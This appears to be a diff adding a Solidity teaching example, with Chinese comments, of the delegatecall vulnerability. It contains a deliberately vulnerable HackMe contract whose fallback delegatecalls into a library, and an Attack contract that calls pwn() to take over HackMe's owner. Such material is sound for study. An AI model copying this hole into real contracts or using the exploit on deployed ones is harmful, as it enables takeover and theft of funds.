@@ -1,0 +1,34 @@
+//SPDX-License-Identifier: MIT
+pragma solidity ^0.8.7;
+contract HackMe {
+address public owner;
+Lib public lib;
+//给lib变量赋值Lib address
+
+constructor(Lib _lib) public {
+    owner = msg.sender;
+    lib = Lib(_lib);
+}
+fallback() external payable {
+    address(lib).delegatecall(msg.data);
+    //回退函数，低级call了Lib的msg.data
+}
+}
+
+contract Lib {
+    address public owner;
+    function pwn() public {
+        owner = msg.sender;
+    }
+}
+
+contract Attack {
+    address public hackMe;
+    constructor(address _hackMe) public {
+        hackMe = _hackMe;
+    }
+    function attack() public {
+        hackMe.call(abi.encodeWithSignature("pwn()"));
+        //当攻击的时候会触发hackMe的回退函数，因为没有pwn()函数，所以会改变hackMe的owner
+    }
+}
